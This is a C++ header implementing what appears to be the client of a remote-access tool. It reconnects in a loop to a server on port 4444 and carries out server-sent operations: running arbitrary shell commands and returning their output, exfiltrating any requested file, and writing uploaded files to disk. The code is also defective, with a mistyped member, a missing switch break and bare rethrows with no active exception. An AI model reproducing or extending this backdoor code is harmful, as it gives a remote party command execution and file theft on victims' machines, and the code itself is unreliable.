#ifndef _CLIENT_H_
#define _CLIENT_H_

#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <array>
#include <fstream>
#include <boost/asio.hpp>
#include <string>
#include <iostream>
#include <filesystem>
#include <boost/algorithm/string.hpp>
#include <unordered_map>
#include "CommandExecuter.hpp"


class Client
{
private:
	using IoService = boost::asio::io_service;
	using TcpResolver = boost::asio::ip::tcp::resolver;
	using TcpResolverIterator = TcpResolver::iterator;
	using TcpSocket = boost::asio::ip::tcp::socket;
	enum OperationType { RunCommand = 1, DownloadFile, UploadFile };

public:

	Client(IoService& ioService)
		: m_ioService(ioService), m_socket(ioService), m_path(R"(C:\Users\ariels\Downloads\Src\c.exe)")
	{
		TcpResolver resolver(ioService);
		m_endpointIterator = resolver.resolve({ "127.0.0.1", "4444" });
		Connect();
		Start();
	}

private:

	void Connect()
	{
		while(true)
		{
			boost::asio::connect(m_socket, m_endpointIterator, m_errorCode);
			if (!m_errorCode)
				return;

			std::cout << "Coudn't connect to server. Check that it is up and listening " << std::endl;

			m_socket.close();
			std::this_thread::sleep_for(std::chrono::seconds(3));
		}

		std::cout << "Connected to: " << m_socket.remote_endpoint().address().to_string() << std::endl;
	}

	void Start()
	{
		while (true)
		{
			switch (ReadOperationType())
			{
			case RunCommand:
				Command();
				break;
			case DownloadFile:
				Download();
				break;
			case UploadFile:
				Upload();
			default:
				break;
			}
		}
	}

	OperationType ReadOperationType()
	{
		auto operation = Response();
		return GetOperationType(operation);
	}

	std::string Response()
	{
		auto responseSize = boost::asio::read_until(m_socket, m_responseBuf, m_delimiter, m_errorCode);
		if (m_errorCode)
			throw; // TODO - handle error

		return CleanReponse(responseSize);
	}

	std::string CleanReponse(size_t responseSize)
	{
		std::string response(
		buffers_begin(m_responseBuf.data()),
		buffers_begin(m_responseBuf.data()) + responseSize - m_delimiter.size() 
		);
		m_responseBuf.consume(responseSize);

		//std::string response((std::istreambuf_iterator<char>(&m_responseBuf)), std::istreambuf_iterator<char>());
		//std::string operation = response.substr(0, responseSize);
		//boost::algorithm::trim(operation);

		return response;
	}

	OperationType GetOperationType(const std::string& operation)
	{
		std::unordered_map<std::string, OperationType> operations
		{
			{"RunCommand", RunCommand},
			{"DownloadFile", DownloadFile},
			{"UploadFile", UploadFile}
		};

		if (!operations.count(operation))
			;// throw exception

		return operations[operation];
	}
	
	void Command()
	{
		auto command = Response();
		CommandExecuter commandExecuter;
		auto commandResult = *commandExecuter.RunCommand(command);
		std::ostream requestStream(&m_requestBuf);
		requestStream << commandResult << m_delimiter;
		Send(m_requestBuf);
	}

	void Download()
	{
		auto filePath = Response();
		m_file.open(filePath, std::ios::in | std::ios::binary);
		if (!m_file)
			throw std::fstream::failure("Failed while opening file"); // TODO - Throw custom exception exception!

		auto fileSize = std::filesystem::file_size(filePath);
		std::ostream requestStream(&m_requestBuf);
		requestStream << fileSize << m_delimiter;
		Send(m_requestBuf);

		while (fileSize > 0)
		{
			m_file.read(m_buf.data(), m_buf.size());
			if (m_file.fail() && !m_file.eof()) 
				throw std::fstream::failure("Failed while reading file");
			
			size_t bufferSize(m_file.gcount());
			auto buf = boost::asio::buffer(m_buf.data(), bufferSize);
			Send(buf);

			fileSize -= bufferSize;
		}
		m_file.close();
	}

	void Upload()
	{
		auto fileToCreate = Response();
		auto fileSize = std::stoi(Response());

		m_file.open(fileToCreate, std::ios::out | std::ios::binary);
		if (!m_file)
			throw; // TODO - throw specific exception

		while (fileSize > 0)
		{
			auto bufferSize = (fileSize < m_buf.size()) ? fileSize : m_buf.size();
			auto buf = boost::asio::buffer(m_buf, bufferSize);
			auto responseSize = boost::asio::read(m_socket, buf, m_errorCode);
			m_file.write(m_buf.data(), responseSize);

			fileSize -= responseSize;
			std::cout << "Remaining bytes: " << fileSize << "\nResponse Size: " << responseSize << "\n Response data:" << buf.data() << std::endl;
		}
		m_file.close();
		std::cout << "File downloaded to - " << fileToCreate << std::endl;
	}


	template<typename Buffer>
	void Send(Buffer& t_buffer)
	{
		boost::asio::write(m_socket, t_buffer, m_errorCode);
		if (m_errorCode)
			throw; // TODO - handle error (reset the connection & reset the m_errorCode to 0)
	}

	void OpenFile()
	{
		m_file.open(m_path, std::ios_base::binary);
		if (m_file.fail())
			throw std::fstream::failure("Failed while opening file " + m_path);

		auto fileSize = std::filesystem::file_size(m_path);
		std::ostream requestStream(&m_requestBuf);
		std::filesystem::path filePath(m_path);
		requestStream << filePath.filename().string() << "\n" << fileSize << m_delimiter;
	}

	void ReadFileBytes(const boost::system::error_code& ec)
	{
		if (ec || !m_file)
			return;

		// Read 1024 bytes from the file into a char array
		m_file.read(m_buf.data(), m_buf.size());
		if (m_file.fail() && !m_file.eof()) {
			auto msg = "Failed while reading file";
			throw std::fstream::failure(msg);
		}

		std::stringstream ss;
		ss << "Send " << m_file.gcount() << " bytes, total: "
			<< m_file.tellg() << " bytes";
		std::cout << ss.str() << std::endl;

		// Converte the char array to a correct buffer type and send it. 
		auto buf = boost::asio::buffer(m_buf.data(), static_cast<size_t>(m_file.gcount()));
		Send(buf);
	}

	TcpResolver m_ioService;
	TcpSocket m_socket;
	TcpResolverIterator m_endpointIterator;
	boost::asio::streambuf m_requestBuf;
	boost::asio::streambuf m_responseBuf;
	std::array<char, 1024> m_buf;
	std::fstream m_file;
	std::string m_path;
	boost::system::error_code m_errorCode;
	const std::string m_delimiter = "\r\n\r\n";
};

#endif // !_CLIENT_H_
